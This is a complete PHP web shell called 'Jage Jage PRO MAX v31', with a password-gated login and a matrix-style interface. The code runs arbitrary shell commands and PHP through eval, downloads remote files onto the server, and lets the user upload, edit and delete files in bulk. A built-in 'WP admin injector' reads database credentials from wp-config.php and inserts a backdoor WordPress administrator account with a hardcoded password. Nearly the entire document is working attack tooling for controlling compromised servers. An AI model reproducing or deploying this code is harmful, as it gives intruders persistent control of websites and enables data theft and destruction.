<?php
session_start();
error_reporting(0);
set_time_limit(0);

// PASSWORD bcrypt: ./sTory An9el
$hash = '$2a$12$G4k63UyXQx7Xaue0m0G7k.IAq6Po0zZZ/VWg0gORWp8pPfRMKXT1.';

if (!isset($_SESSION['login'])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hash)) {
        $_SESSION['login'] = true;
        header("Location: ?"); exit;
    }
    die('<style>body{background:black;color:lime;font-family:monospace;text-align:center;padding-top:100px}input{background:black;color:lime;border:1px solid lime;padding:5px}</style><h2>Jage Jage PRO MAX</h2><form method=post><input type=password name=pass placeholder=password><button>Login</button></form>');
}

if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

$base = realpath(".");
$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $base;
if (!$dir || !is_dir($dir)) $dir = $base;
chdir($dir);

$status = ""; $cmd_out = "";

// --- ACTIONS LOGIC ---
if (isset($_FILES['f'])) { if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) $status = "Upload Success! 😝"; }
if (isset($_GET['del'])) { @unlink($_GET['del']); header("Location: ?dir=".urlencode($dir)); }
if (isset($_POST['rename'])) { @rename($_POST['old'], $_POST['new']); }
if (isset($_POST['save'])) { file_put_contents($_POST['file'], $_POST['content']); $status = "Saved! 😝"; }

// MASS DELETE
if (isset($_POST['mass_delete']) && !empty($_POST['files'])) {
    foreach ($_POST['files'] as $f) { is_dir($f) ? @rmdir($f) : @unlink($f); }
    $status = "Mass Delete Success! 😝";
}

// REAL WP ADMIN INJECTOR
if (isset($_POST['add_wp'])) {
    if (file_exists('wp-config.php')) {
        $config = file_get_contents('wp-config.php');
        preg_match("/'DB_NAME',\s*'(.+?)'/", $config, $db_name);
        preg_match("/'DB_USER',\s*'(.+?)'/", $config, $db_user);
        preg_match("/'DB_PASSWORD',\s*'(.+?)'/", $config, $db_pass);
        preg_match("/'DB_HOST',\s*'(.+?)'/", $config, $db_host);
        preg_match("/\$table_prefix\s*=\s*'(.+?)'/", $config, $db_prefix);

        $conn = mysqli_connect($db_host[1], $db_user[1], $db_pass[1], $db_name[1]);
        if ($conn) {
            $prefix = $db_prefix[1];
            $user = 'jage_admin';
            $pass = md5('jage123');
            $mail = 'angel@valhalla.corp';
            
            mysqli_query($conn, "INSERT INTO {$prefix}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$user', '$pass', '$user', '$mail', NOW(), 0, '$user')");
            $id = mysqli_insert_id($conn);
            mysqli_query($conn, "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
            mysqli_query($conn, "INSERT INTO {$prefix}usermeta (user_id, meta_key, meta_value) VALUES ($id, '{$prefix}user_level', '10')");
            $status = "Sukses! User: jage_admin | Pass: jage123 😝";
            mysqli_close($conn);
        } else { $status = "Koneksi DB Gagal! 😝"; }
    } else { $status = "wp-config.php tidak ada! 😝"; }
}

if (isset($_POST['rem_up']) && !empty($_POST['url'])) {
    if(@file_put_contents(basename($_POST['url']), file_get_contents($_POST['url']))) $status = "Remote Success! 😝";
}
if (isset($_POST['exec_php']) && !empty($_POST['php_code'])) {
    ob_start(); eval('?>'.$_POST['php_code']); $cmd_out = ob_get_contents(); ob_end_clean();
}
if (isset($_POST['shell_cmd'])) { $cmd_out = shell_exec($_POST['shell_cmd']." 2>&1"); }

if (isset($_GET['copy'])) { $_SESSION['cp'] = $dir.DIRECTORY_SEPARATOR.$_GET['copy']; $status = "Copied! 😝"; }
if (isset($_POST['paste']) && isset($_SESSION['cp'])) {
    $src = $_SESSION['cp']; $info = pathinfo($src);
    copy($src, $dir.DIRECTORY_SEPARATOR.$info['filename'].'_copy.'.$info['extension']);
    $status = "Pasted! 😝";
}

$files = scandir(".");
?>
<!DOCTYPE html>
<html>
<head>
    <title>Jage Jage PRO MAX v31</title>
    <style>
        body { margin:0; background:black; color:#00ff00; font-family:monospace; font-size: 13px; overflow-x: hidden; }
        canvas { position:fixed; top:0; left:0; z-index:-1; }
        .topbar { background:rgba(17,17,17,0.9); padding:10px; border-bottom:1px solid #0f0; display: flex; align-items: center; gap: 10px; }
        .tools-box { background:rgba(0,0,0,0.8); padding:10px; border-bottom:1px solid #333; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
        a { color:#0ff; text-decoration:none; }
        table { width:100%; border-collapse:collapse; background:rgba(0,0,0,0.7); margin-top: 5px; }
        td, th { padding:8px; border-bottom:1px solid #222; text-align: left; }
        tr:hover { background:rgba(0,255,0,0.1); }
        .btn { color:black; background:#0f0; padding:3px 8px; border:none; cursor:pointer; font-family:monospace; font-weight:bold; font-size: 11px; }
        .inp { background:black; color:lime; border:1px solid #0f0; padding:3px; font-family:monospace; font-size:11px; }
        .footer { text-align:center; padding:20px; color:#555; font-weight:bold; }
        textarea { width:100%; height:400px; background:black; color:lime; border:1px solid #0f0; }
        .out-box { background:#000; border:1px solid #0f0; color:#fff; padding:10px; margin:10px; font-size:11px; white-space:pre-wrap; }
    </style>
</head>
<body>
<canvas id="matrix"></canvas>

<div class="topbar">
    <div style="display: flex; gap: 5px;">
        <a href="?dir=<?= urlencode($base) ?>" class="btn">HOME</a> 
        <a href="?logout" class="btn" style="background:red;color:white;">LOGOUT</a>
    </div>
    <span style="color:#555;">|</span>
    <div style="flex: 1;">
        <?php
        $current_path = getcwd(); $parts = explode(DIRECTORY_SEPARATOR, $current_path); $build_path = "";
        foreach ($parts as $p) {
            if ($p == "") { echo "<a href='?dir=/'>/</a>"; $build_path = "/"; continue; }
            $build_path .= ($build_path == "/" ? "" : DIRECTORY_SEPARATOR) . $p;
            echo " <a href='?dir=" . urlencode($build_path) . "'>$p</a> /";
        }
        ?>
    </div>
</div>

<div class="tools-box">
    <form method="post" enctype="multipart/form-data" style="display:flex; align-items:center; gap:5px;">
        <span>Upload:</span> <input type="file" name="f" class="inp" style="width:130px;"> <button class="btn">GO</button>
    </form>
    |
    <form method="post" style="display:flex; align-items:center; gap:5px;">
        <span>Remote:</span> <input type="text" name="url" placeholder="URL" class="inp" style="width:100px;"> <button name="rem_up" class="btn">GET</button>
    </form>
    |
    <form method="post" style="display:flex; align-items:center; gap:5px;">
        <span>PHP:</span> <input type="text" name="php_code" placeholder="Code" class="inp" style="width:70px;"> <button name="exec_php" class="btn">RUN</button>
    </form>
    |
    <form method="post" style="display:inline;">
        <button name="add_wp" class="btn" style="background:#21759b; color:white;">ADD WP ADMIN</button>
    </form>
    |
    <button type="submit" form="mass_form" name="mass_delete" class="btn" style="background:red;color:white;" onclick="return confirm('Hapus yang dipilih?')">DELETE SELECTED</button>
    <?php if(isset($_SESSION['cp'])): ?>
    | <form method="post" style="display:inline;"><button name="paste" class="btn" style="background:cyan;">PASTE</button></form>
    <?php endif; ?>
</div>

<div class="tools-box">
    <form method="post" style="display:flex; width:100%; gap:5px; align-items:center;">
        <span>Terminal:</span> <input type="text" name="shell_cmd" placeholder="Command..." class="inp" style="flex:1;"> 
        <button class="btn">EXECUTE</button>
    </form>
</div>

<?php if($cmd_out): ?><div class="out-box"><b>Console Output:</b><br><?= htmlspecialchars($cmd_out) ?></div><?php endif; ?>
<?php if($status): ?><div style="background:lime; color:black; padding:5px; text-align:center; font-weight:bold;"><?= $status ?></div><?php endif; ?>

<?php if (isset($_GET['edit'])): 
    $file = $_GET['edit']; $content = htmlspecialchars(file_get_contents($file)); ?>
    <div style='padding:15px;'><h3>Edit: <?= basename($file) ?></h3>
    <form method=post><input type=hidden name=file value='<?= $file ?>'><textarea name=content><?= $content ?></textarea>
    <br><button name=save class='btn' style='margin-top:10px;'>SAVE</button> <a href='?dir=<?= urlencode($dir) ?>' style='color:red;'>[Cancel]</a></form></div>
<?php else: ?>

<form id="mass_form" method="post">
<table>
    <tr style="background:#111;">
        <th width="20"><input type="checkbox" onclick="for(c of document.getElementsByName('files[]')) c.checked=this.checked"></th>
        <th>Name</th>
        <th width="100">Size</th>
        <th width="400">Action</th>
    </tr>
    <?php foreach ($files as $f): if($f == "." || $f == "..") continue; ?>
    <tr>
        <td><input type="checkbox" name="files[]" value="<?= htmlspecialchars($f) ?>"></td>
        <td><?= is_dir($f) ? "📁" : "📄" ?> <a href="<?= is_dir($f) ? "?dir=".urlencode(realpath($f)) : "#" ?>"><?= $f ?></a></td>
        <td style="font-size:11px;"><?= is_file($f) ? number_format(filesize($f)/1024, 2)." KB" : "-" ?></td>
        <td>
            <?php if (is_file($f)): ?>
                <a href="?edit=<?= $f ?>&dir=<?= urlencode($dir) ?>">[Edit]</a> |
                <a href="?copy=<?= $f ?>&dir=<?= urlencode($dir) ?>">[Copy]</a> |
                <a href="?dir=<?= urlencode($dir) ?>&del=<?= $f ?>" onclick="return confirm('Hapus?')">[Del]</a> |
                <a href="<?= $f ?>" download>[DL]</a>
                <div style="display:inline; margin-left:5px;">
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="old" value="<?= $f ?>">
                        <input name="new" value="<?= $f ?>" class="inp" style="width:70px;">
                        <button name="rename" class="btn" style="padding:1px 3px; font-size:10px;">Ren</button>
                    </form>
                </div>
            <?php endif; ?>
        </td>
    </tr>
    <?php endforeach; ?>
</table>
</form>
<?php endif; ?>

<div class="footer">coded by ./sTory An9el</div>

<script>
var c = document.getElementById("matrix"); var ctx = c.getContext("2d");
c.height = window.innerHeight; c.width = window.innerWidth;
var letters = "01"; letters = letters.split("");
var fontSize = 14; var columns = c.width/fontSize;
var drops = []; for(var x=0;x<columns;x++) drops[x]=1;
function draw(){
    ctx.fillStyle="rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
    ctx.fillStyle="#0F0"; ctx.font=fontSize+"px monospace";
    for(var i=0;i<drops.length;i++){
        var text=letters[Math.floor(Math.random()*letters.length)];
        ctx.fillText(text,i*fontSize,drops[i]*fontSize);
        if(drops[i]*fontSize>c.height && Math.random()>0.975) drops[i]=0;
        drops[i]++;
    }
}
setInterval(draw,33);
window.onresize = function(){ c.height = window.innerHeight; c.width = window.innerWidth; columns = c.width/fontSize; };
</script>
</body>
</html>
